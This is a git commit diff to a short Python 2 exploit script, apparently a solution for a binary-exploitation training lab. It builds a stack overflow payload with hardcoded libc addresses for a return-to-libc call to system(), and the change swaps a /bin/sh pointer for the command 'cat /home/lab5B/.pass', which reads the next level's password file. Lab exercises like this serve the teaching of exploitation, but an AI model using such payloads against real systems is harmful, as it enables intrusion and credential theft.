c203bf4431647d082d6632ea3f077eed18f38e9d
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-18 09:05:28 +0100

    Update lab5c_new.py

--- lab5c_new.py
+++ lab5c_new.py
@@ -1,24 +1,18 @@
 import struct
 
-def convert_to_int_le(string):
-    return str(int(string[::-1].encode('hex'), 16))
-
 shellcode = ""
 
 SYSTEM_ADDR = struct.pack("<I", 0xb7e63190)
-BIN_SH_ADDR = struct.pack("<I", 0xb7f83a24)
+CMD_ADDR = struct.pack("<I", 0xbfff484)
 MAIN_RET_ADDR = struct.pack("<I", 0xb7e3ca83)
+CMD_TO_EXEC = "cat /home/lab5B/.pass"
 JUNK = "A" * 156
 
 shellcode += JUNK
 # Stack frame for calling system()
 shellcode += SYSTEM_ADDR
 shellcode += MAIN_RET_ADDR
-shellcode += BIN_SH_ADDR
-shellcode += convert_to_int_le("/hom")
-shellcode += convert_to_int_le("e/la")
-shellcode += convert_to_int_le("b5B/")
-shellcode += convert_to_int_le(".pas")
-shellcode += convert_to_int_le("s")
+shellcode += CMD_ADDR
+shellcode += CMD_TO_EXEC
 
 print shellcode
